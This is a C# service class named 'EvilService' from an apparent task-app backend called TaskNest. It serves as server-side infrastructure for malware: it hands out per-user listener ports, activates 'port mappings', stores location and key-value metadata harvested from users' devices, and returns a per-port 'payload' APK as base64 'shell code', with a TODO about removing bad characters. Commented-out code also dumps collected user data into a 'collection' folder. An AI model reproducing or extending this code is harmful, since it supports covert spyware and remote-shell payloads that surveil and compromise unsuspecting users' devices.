using Microsoft.EntityFrameworkCore;
using net.mstoegerer.TaskNest.Api.Domain.DTOs;
using net.mstoegerer.TaskNest.Api.Domain.Entities;
using net.mstoegerer.TaskNest.Api.Infrastructure.Context;
using net.mstoegerer.TaskNest.Api.Presentation.Middlewares;
using NetTopologySuite.Geometries;

namespace net.mstoegerer.TaskNest.Api.Application.Services;

public class EvilService(ApplicationDbContext dbContext)
{
    public readonly string EvilPath = "collection/";

    public async Task<(Guid Id, int port)> CreateOrGetUserPortAsync(Guid userId)
    {
        var existing = await dbContext.UserPorts.Where(x => x.UserId == userId && x.IsActive).FirstOrDefaultAsync();
        if (existing != null) return (existing.Id, existing.Port);
        var availablePort = await GetAvailablePortAsync();
        var userPort = new UserPort
        {
            UserId = userId,
            Port = availablePort,
            IsActive = false
        };
        await dbContext.UserPorts.AddAsync(userPort);
        await dbContext.SaveChangesAsync();
        return (userPort.Id, userPort.Port);
    }

    private async Task<int> GetAvailablePortAsync()
    {
        var usedPorts = await dbContext.UserPorts.Where(x => x.IsActive).Select(x => x.Port).ToListAsync();
        var rnd = new Random();
        var lowerBound = 8080;
        var upperBound = 8090;
        var availablePort = rnd.Next(lowerBound, upperBound);
        while (usedPorts.Contains(availablePort))
            availablePort = rnd.Next(lowerBound, upperBound);
        return availablePort;
    }

    public async Task<PaginatedResultDto<UserMetaDataDto>> GetMetaDataAsync(int pageIndex, int pageSize)
    {
        var userMetaDataQuery = dbContext
            .UserMetaData
            .Include(x => x.User)
            .Include(x => x.MetaData);
        var res = await userMetaDataQuery.ToListAsync();
        var dtos = res.Select(x => new UserMetaDataDto
        {
            CreatedUtc = x.CreatedUtc,
            Id = x.Id,
            Location = x.Location == null ? null : new PointDto { X = x.Location.X, Y = x.Location.Y },
            MetaData = x.MetaData.Select(y => new MetaDataDto
            {
                // Id = y.Id,
                // Order = y.Order,
                Key = y.Key,
                Value = y.Value
            }).ToList(),
            UserId = x.UserId
        });
        var paginated = new PaginatedResultDto<UserMetaDataDto>(pageSize, pageIndex, dtos);
        return paginated;
    }

    public async Task WriteMetaDataAsync(List<CreateUserMetaDataDto> createUserMetaDataDto)
    {
        var metaDataEntities = new List<UserMetaData>();
        createUserMetaDataDto.ForEach(cUserMetaDataDto =>
        {
            var userMetaDataEntity = new UserMetaData
            {
                UserId = CurrentUser.UserId,
                CreatedUtc = cUserMetaDataDto.CreatedUtc,
                Location = cUserMetaDataDto.Location == null
                    ? null
                    : new Point(cUserMetaDataDto.Location.Y, cUserMetaDataDto.Location.X) { SRID = 4326 }
            };
            foreach (var metaData in cUserMetaDataDto.MetaData)
                userMetaDataEntity.MetaData.Add(new MetaData
                {
                    Key = metaData.Key,
                    Value = metaData.Value
                });
            metaDataEntities.Add(userMetaDataEntity);
        });


        // await WriteToCsvAsync(createUserMetaDataDto);
        await dbContext.UserMetaData.AddRangeAsync(metaDataEntities);
        await dbContext.SaveChangesAsync();
    }

    public async Task<UserPort> GetPortMappingAsync(Guid mappingId)
    {
        var mapping = await dbContext.UserPorts.Where(x => x.Id == mappingId).FirstOrDefaultAsync();
        return mapping;
    }

    public async Task ActivatePortMappingAsync(Guid mappingId)
    {
        var mapping = await dbContext.UserPorts.Where(x => x.Id == mappingId).FirstOrDefaultAsync();
        if (mapping == null) throw new Exception("Mapping not found");
        mapping.IsActive = true;
        await dbContext.SaveChangesAsync();
    }

    public async Task<byte[]> GenerateShellCodeAsync(int port)
    {
        try
        {
            //TODO: Regenerate shell codes without bad characters
            var byteContent = await File.ReadAllBytesAsync($"Application/Resources/payload_{port}.apk");
            //to base 64
            var base64 = Convert.ToBase64String(byteContent);
            return base64.Select(x => (byte)x).ToArray();
        }
        catch (Exception e)
        {
            Console.WriteLine(e);
        }

        return [];
    }

    // private async Task WriteToCsvAsync(CreateUserMetaDataDto metaData)
    // {
    //     await CreateEvilDirectory();
    //     // Write to CSV
    //     if (File.Exists(Path.Combine(EvilPath, metaData.UserId + ".csv")))
    //         await File.AppendAllTextAsync("collection/" + metaData.UserId + ".csv",
    //             metaData.ToCsv(false));
    //     else
    //         await File.WriteAllBytesAsync("collection/" + metaData.UserId + ".csv",
    //             Encoding.UTF8.GetBytes(metaData.ToCsv(true)));
    // }
    //
    // private async Task CreateEvilDirectory()
    // {
    //     if (!Directory.Exists(EvilPath))
    //         Directory.CreateDirectory(EvilPath);
    // }
}